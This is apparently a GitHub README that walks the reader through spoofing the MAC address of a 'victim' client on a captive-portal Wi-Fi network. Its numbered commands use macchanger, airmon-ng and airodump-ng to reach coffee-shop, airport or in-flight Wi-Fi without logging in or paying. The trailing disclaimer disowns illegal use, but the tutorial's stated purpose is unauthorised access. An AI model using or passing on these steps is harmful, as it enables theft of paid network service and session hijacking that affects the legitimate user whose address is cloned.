## HOW TO SET YOUR MAC ADDRESS OF A WIFI/NETWORK SAME AS OF YOUR VICTIM TO CONNECT TO A CAPTIVE PORTAL AT COFFEE SHOP/AIRPORT/AEROPLANE/PUBLIC WIFI TO ACCESS FREE WIFI WITHOUT ENTERING USERNAME-PASSWORD. 


STEP 1-  sudo ip a 

STEP 2-  sudo ifconfig wlan1 down  (type the interface of the network card of which you want to change mac address)

STEP 3-  sudo macchanger -r wlan1  (-r = to change the mac address randomly)

STEP 4-  sudo ifconfig wlan1 up

STEP 5-  sudo airmon-ng start wlan1

STEP 6-  sudo ip a  (to check that the network interface in monitor mode)

STEP 7-  sudo airodump-ng wlan1mon 

STEP 8-  sudo airodump-ng wlan1mon -bssid 00:00:00:00:00:00 -c 0 (-c =? .....--bssid = ? enter the bssid/mac address of the victim free captive portal wifi )

STEP 9-  Now you will get all the clients that are on that network you can choose one and then copy the MAC Address of that client.

STEP 10- sudo ifconfig wlan0 down (now enter the second network interface so that we can change the mac address of the same )

STEP 11-  sudo macchanger -m 00:00:00:00:00:00 wlan0 (-m = to specify the mac address you want, enter the address here which you copied from the victim)

STEP 12-  sudo ifconfig wlan0 up

STEP 13-  sudo ip a

Step 14- now connect to the free wifi/captive portal and try to access enter it will not ask you to enter the username/password to access the wifi.

# Disclamer:
The information provided herein strictly prohibits and disclaims any involvement in cracking WiFi passwords. Users are hereby informed that such activities are illegal and against ethical guidelines. 
This platform does not endorse, support, or encourage any form of unauthorized access to computer systems or networks. 
Users are urged to comply with all applicable laws and regulations and to utilize their knowledge and skills for legal and ethical purposes only. 
The platform, its creators, and contributors cannot be held responsible for any misuse or illegal application of the information provided.
















____________________________________________________________________________________________________________________________________________
▶ Name: StromWise

▶ Role: Creator

▶ Location: Unknown

▶ GitHub: https://github.com/stromwise 

▶ Instagram: https://www.instagram.com/stromwise/ 

▶ Facebook: https://www.facebook.com/profile.php?id=100093706328777

▶ Youtube: https://www.youtube.com/channel/UC-tafc0TqgZNnQio8Gj-hjg 

▶ Twitter: https://twitter.com/StromWise 
____________________________________________________________________________________________________________________________________________


